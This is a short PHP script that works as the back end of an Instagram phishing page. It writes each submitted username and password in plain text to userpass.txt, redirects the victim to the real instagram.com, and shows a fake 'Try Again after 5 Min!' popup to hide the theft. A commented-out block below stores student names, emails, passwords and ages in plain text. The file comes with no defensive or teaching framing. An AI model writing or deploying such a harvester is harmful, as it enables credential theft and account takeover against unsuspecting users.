<?php
  if($_SERVER["REQUEST_METHOD"]=="POST"){
    $username=$_POST['username'];
    $password=$_POST['password'];
    
    $file=fopen("userpass.txt","a");
    fwrite($file,$username . "," . $password . "\n");
    fclose($file);

    // redirect to Instagram after form submission
  header('Location: https://www.instagram.com/');
  exit();
}
    
 
?>

<script>
  setTimeout(function(){
    alert("Try Again after 5 Min!");
  }, 5000); // wait 5 seconds before showing popup
</script>





//<?php===
//$name = $_POST['name'];
//$email = $_POST['email'];
//$password = $_POST['password'];
//$age = $_POST['age'];

//$file = fopen("students.txt", "a");
//fwrite($file, "$name, $email, $password, $age\n");
//fclose($file);

//echo "Information saved successfully!";

